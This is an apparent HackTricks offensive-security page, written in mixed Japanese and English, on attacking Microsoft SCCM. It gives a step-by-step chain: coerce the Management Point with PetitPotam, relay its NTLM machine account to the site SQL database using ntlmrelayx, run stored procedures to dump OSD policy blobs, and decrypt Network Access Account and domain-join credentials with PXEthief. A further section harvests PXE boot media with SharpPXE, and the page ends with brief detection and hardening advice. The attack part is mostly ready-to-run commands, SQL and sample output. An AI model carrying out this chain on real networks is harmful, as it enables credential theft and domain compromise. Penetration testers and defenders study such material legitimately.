# SCCM Management Point NTLM Relay to SQL – OSD Policy Secret Extraction

{{#include ../../banners/hacktricks-training.md}}

## TL;DR
**System Center Configuration Manager (SCCM) Management Point (MP)** に SMB/RPC 経由で認証するよう強制し、その NTLM machine account を **site database (MSSQL)** に **relaying** することで、`smsdbrole_MP` / `smsdbrole_MPUserSvc` rights を取得できます。これらの roles により、**Operating System Deployment (OSD)** policy blobs（Network Access Account credentials、Task-Sequence variables など）を公開する一連の stored procedures を呼び出せます。blobs は hex-encoded/encrypted ですが、**PXEthief** を使用して decode および decrypt でき、plaintext secrets を取得できます。<sup>[[2]](#references)</sup>

High-level chain:
1. MP と site DB を Discover ↦ unauthenticated HTTP endpoint `/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA`。
2. `ntlmrelayx.py -t mssql://<SiteDB> -ts -socks` を起動。
3. **PetitPotam**、PrinterBug、DFSCoerce などを使用して MP を Coerce。
4. SOCKS proxy 経由で `mssqlclient.py -windows-auth` に接続し、relayed **<DOMAIN>\\<MP-host>$** account として認証。
5. Execute:
* `use CM_<SiteCode>`
* `exec MP_GetMachinePolicyAssignments N'<UnknownComputerGUID>',N''`
* `exec MP_GetPolicyBody N'<PolicyID>',N'<Version>'`   (または `MP_GetPolicyBodyAfterAuthorization`)
6. `0xFFFE` BOM を Strip し、`xxd -r -p` → XML  → `python3 pxethief.py 7 <hex>`。

`OSDJoinAccount/OSDJoinPassword`、`NetworkAccessUsername/Password` などの secrets を、PXE や clients に触れることなく recover できます。<sup>[[1]](#references)[[3]](#references)</sup>

---

## 1. Enumerating unauthenticated MP endpoints
MP ISAPI extension **GetAuth.dll** は、authentication を必要としない複数の parameters を expose します（site が PKI-only の場合を除く）。<sup>[[1]](#references)</sup>

| Parameter | Purpose |
|-----------|---------|
| `MPKEYINFORMATIONMEDIA` | site signing cert public key と、*x86* / *x64* **All Unknown Computers** devices の GUIDs を返します。 |
| `MPLIST` | site 内のすべての Management-Point を List します。 |
| `SITESIGNCERT` | Primary-Site signing certificate を返します（LDAP なしで site server を identify）。 |

後の DB queries で **clientID** として使用する GUIDs を取得します：
```bash
curl http://MP01.contoso.local/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA | xmllint --format -
```
---

## 2. MP machine account を MSSQL に Relay
```bash
# 1. Start the relay listener (SMB→TDS)
ntlmrelayx.py -ts -t mssql://10.10.10.15 -socks -smb2support

# 2. Trigger authentication from the MP (PetitPotam example)
python3 PetitPotam.py 10.10.10.20 10.10.10.99 \
-u alice -p P@ssw0rd! -d CONTOSO -dc-ip 10.10.10.10
```
coercion が発生すると、次のように表示されます：
```
[*] Authenticating against mssql://10.10.10.15 as CONTOSO/MP01$ SUCCEED
[*] SOCKS: Adding CONTOSO/MP01$@10.10.10.15(1433)
```
---

## 3. stored procedures を介して OSD policies を特定する
SOCKS proxy 経由で接続します（デフォルトではポート 1080）：<sup>[[1]](#references)</sup>
```bash
proxychains mssqlclient.py CONTOSO/MP01$@10.10.10.15 -windows-auth
```
**CM_<SiteCode>** DBに切り替えます（3桁のサイトコードを使用します。例：`CM_001`）。

### 3.1  Unknown-Computer GUIDを検索（任意）
```sql
USE CM_001;
SELECT SMS_Unique_Identifier0
FROM dbo.UnknownSystem_DISC
WHERE DiscArchKey = 2; -- 2 = x64, 0 = x86
```
### 3.2  割り当てられたポリシーの一覧表示
```sql
EXEC MP_GetMachinePolicyAssignments N'e9cd8c06-cc50-4b05-a4b2-9c9b5a51bbe7', N'';
```
各行には `PolicyAssignmentID`、`Body`（hex）、`PolicyID`、`PolicyVersion` が含まれます。

以下のポリシーに注目します。
* **NAAConfig** – Network Access Account の認証情報
* **TS_Sequence** – Task Sequence の変数（OSDJoinAccount/Password）
* **CollectionSettings** – run-as アカウントが含まれる場合があります

### 3.3 完全な body の取得
すでに `PolicyID` と `PolicyVersion` がある場合は、次の方法で clientID の要件を省略できます。
```sql
EXEC MP_GetPolicyBody N'{083afd7a-b0be-4756-a4ce-c31825050325}', N'2.00';
```
> IMPORTANT: SSMSで「Maximum Characters Retrieved」を65535より大きく設定してください。そうしないとblobがtruncatedされます。

---

## 4. blobをDecode & decryptする
```bash
# Remove the UTF-16 BOM, convert from hex → XML
echo 'fffe3c003f0078…' | xxd -r -p > policy.xml

# Decrypt with PXEthief (7 = decrypt attribute value)
python3 pxethief.py 7 $(xmlstarlet sel -t -v "//value/text()" policy.xml)
```
復元された秘密情報の例:
```
OSDJoinAccount : CONTOSO\\joiner
OSDJoinPassword: SuperSecret2025!
NetworkAccessUsername: CONTOSO\\SCCM_NAA
NetworkAccessPassword: P4ssw0rd123
```
---

## 5. Relevant SQL roles & procedures
relay 後、login は以下にマッピングされます:<sup>[[1]](#references)</sup>
* `smsdbrole_MP`
* `smsdbrole_MPUserSvc`

これらの role には多数の EXEC 権限が公開されています。この攻撃で使用する主なものは以下です:

| Stored Procedure | Purpose |
|------------------|---------|
| `MP_GetMachinePolicyAssignments` | `clientID` に適用された policy を一覧表示します。 |
| `MP_GetPolicyBody` / `MP_GetPolicyBodyAfterAuthorization` | 完全な policy body を返します。 |
| `MP_GetListOfMPsInSiteOSD` | `MPKEYINFORMATIONMEDIA` path によって返されます。 |

以下を使用して完全な一覧を確認できます。
```sql
SELECT pr.name
FROM   sys.database_principals AS dp
JOIN   sys.database_permissions AS pe ON pe.grantee_principal_id = dp.principal_id
JOIN   sys.objects AS pr ON pr.object_id = pe.major_id
WHERE  dp.name IN ('smsdbrole_MP','smsdbrole_MPUserSvc')
AND  pe.permission_name='EXECUTE';
```
---

## 6. PXE boot media harvesting (SharpPXE)
* **PXE reply over UDP/4011**: PXE 用に構成された Distribution Point に PXE boot request を送信します。proxyDHCP response から、`SMSBoot\\x64\\pxe\\variables.dat`（encrypted config）や `SMSBoot\\x64\\pxe\\boot.bcd` などの boot path、および optional encrypted key blob が明らかになります。<sup>[[4]](#references)</sup>
* **Retrieve boot artifacts via TFTP**: 返された path を使用して、TFTP 経由で `variables.dat` を download します（unauthenticated）。この file は小さく（数 KB）、encrypted media variables が含まれています。
* **Decrypt or crack**:
- response に decryption key が含まれている場合は、**SharpPXE** に渡して `variables.dat` を直接 decrypt します。
- key が提供されない場合（PXE media が custom password で保護されている場合）、SharpPXE は offline cracking 用の **Hashcat-compatible** `$sccm$aes128$...` hash を出力します。password を recovery した後、file を decrypt します。
* **Parse decrypted XML**: plaintext variables には SCCM deployment metadata（**Management Point URL**、**Site Code**、media GUID、その他の identifier）が含まれています。SharpPXE はこれらを parse し、GUID/PFX/site parameter が prefilled された、follow-on abuse 用の実行可能な **SharpSCCM** command を表示します。
* **Requirements**: PXE listener（UDP/4011）および TFTP への network reachability のみが必要で、local admin privilege は不要です。

---

## 7. Detection & Hardening
1. **Monitor MP logins** – MP computer account が、自身の host ではない IP から login している場合は、relay の可能性があります。<sup>[[1]](#references)</sup>
2. site database で **Extended Protection for Authentication (EPA)** を有効にします（`PREVENT-14`）。
3. 未使用の NTLM を disable し、SMB signing を enforce し、RPC を restrict します（`PetitPotam`/`PrinterBug` に対して使用されるものと同じ mitigation）。
4. IPSec / mutual-TLS を使用して MP ↔ DB communication を harden します。
5. **Constrain PXE exposure** – firewall で UDP/4011 と TFTP を trusted VLAN に制限し、PXE password を要求するとともに、`SMSBoot\\*\\pxe\\variables.dat` の TFTP download を alert します。<sup>[[4]](#references)</sup>

---

## See also
* NTLM relay fundamentals:

{{#ref}}
../ntlm/README.md
{{#endref}}

* MSSQL abuse & post-exploitation:

{{#ref}}
abusing-ad-mssql.md
{{#endref}}

## References
- [1] [I’d Like to Speak to Your Manager: Stealing Secrets with Management Point Relays](https://specterops.io/blog/2025/07/15/id-like-to-speak-to-your-manager-stealing-secrets-with-management-point-relays/)
- [2] [PXEthief](https://github.com/MWR-CyberSec/PXEThief)
- [3] [Misconfiguration Manager – ELEVATE-4 & ELEVATE-5](https://github.com/subat0mik/Misconfiguration-Manager)
- [4] [SharpPXE](https://github.com/leftp/SharpPXE)

{{#include ../../banners/hacktricks-training.md}}
